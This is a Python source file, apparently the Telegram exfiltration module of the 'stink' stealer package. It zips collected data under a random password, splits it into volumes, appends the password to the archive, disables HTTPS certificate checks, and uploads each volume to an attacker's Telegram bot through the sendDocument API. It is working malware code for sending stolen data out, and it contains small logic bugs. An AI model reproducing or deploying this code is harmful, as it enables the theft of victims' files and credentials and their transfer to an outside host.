from io import BytesIO
from typing import Tuple, Union
from urllib.request import Request, urlopen
from stink.abstract import AbstractSender
import os
import pyminizip
import random
import string
import base64

class Telegram(AbstractSender):
    def __init__(self, token: str, user_id: int):
        super().__init__()
        self.__token = token
        self.__user_id = user_id
        self.__url = f"https://api.telegram.org/bot{self.__token}/sendDocument"

    def __get_sender_data(self, file_name: str, file_data: bytes) -> Tuple[str, bytes]:
        try:
            content_type, body = self._encoder.encode(
                [("chat_id", self.__user_id), ("caption", self.__preview)],
                [("document", file_name, BytesIO(file_data))]
            )
            return content_type, body
        except Exception as e:
            print(f"Error in __get_sender_data: {str(e)}")
            return None, None

    def __send_file(self, file_name: str, file_data: bytes) -> None:
        content_type, body = self.__get_sender_data(file_name, file_data)
        if content_type is None or body is None:
            print("Failed to prepare data for sending")
            return

        query = Request(method="POST", url=self.__url, data=body)
        query.add_header("User-Agent", self._config.UserAgent)
        query.add_header("Content-Type", content_type)

        try:
            response = urlopen(query)
            print(f"File sent successfully. Response: {response.read().decode()}")
        except Exception as e:
            print(f"Error sending file: {str(e)}")

    def archive_and_encrypt_data(self, data: bytes, zip_name: str, password: str, volume_size_mb: int = 5) -> list:
        try:
            temp_dir = "temp_files"
            os.makedirs(temp_dir, exist_ok=True)

            temp_file = os.path.join(temp_dir, f"{zip_name}_temp.zip")
            with open(temp_file, 'wb') as f:
                f.write(data)

            zip_path = os.path.join(temp_dir, f"{zip_name}.zip")
            file_size = len(data)
            volume_size = volume_size_mb * 1024 * 1024
            compression_level = 5
            volumes = []

            pyminizip.compress(temp_file, None, zip_path, password, compression_level)

            if os.path.getsize(zip_path) > volume_size:
                with open(zip_path, 'rb') as f:
                    zip_data = f.read()

                os.remove(zip_path)

                for i, chunk in enumerate(range(0, len(zip_data), volume_size)):
                    volume_name = f"{zip_path}.{i + 1:03d}"
                    with open(volume_name, 'wb') as f:
                        f.write(zip_data[chunk:chunk + volume_size])

                    # Добавляем пароль в конец последнего тома
                    if i == (len(range(0, len(data), volume_size)) - 1):
                        with open(volume_name, 'ab') as f:
                            pass1 = password.encode()
                            pass2 = base64.b64encode(password.encode())
                            f.write(b'' + pass2)
                    print(f"[Telegram sender]: Сгенерирован пароль для шифрования: {password}")
                    print(base64.b64encode(password.encode()).decode())

                    volumes.append(volume_name)
                    print(f"Volume created: {volume_name}")

                print(f"Data successfully archived and encrypted into multi-volume archive.")
            else:
                # Добавляем пароль в конец архива
                with open(zip_path, 'ab') as f:
                    f.write(b'' + password.encode())

                volumes.append(zip_path)
                print(f"Data successfully archived and encrypted: {zip_path}")

            os.remove(temp_file)
            print(f"[Telegram sender]: Generated encryption password: {password}")
            print(base64.b64encode(password.encode()).decode())

            return volumes

        except Exception as e:
            print(f"An error occurred during archiving and encryption: {str(e)}")
            return []

    def run(self, zip_name: str, data: BytesIO, preview: str) -> None:
        self.__zip_name = zip_name
        self.__data = data.getvalue()  # Get bytes from BytesIO
        self.__preview = preview

        try:
            self._create_unverified_https()

            password = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            print(f"[Telegram sender]: Generated encryption password: {password}")

            volumes = self.archive_and_encrypt_data(self.__data, self.__zip_name, password)

            for volume in volumes:
                with open(volume, 'rb') as f:
                    volume_data = f.read()
                self.__send_file(os.path.basename(volume), volume_data)
                print(f"Attempted to send volume: {volume}")

            for volume in volumes:
                os.remove(volume)

        except Exception as e:
            print(f"[Telegram sender]: {repr(e)}")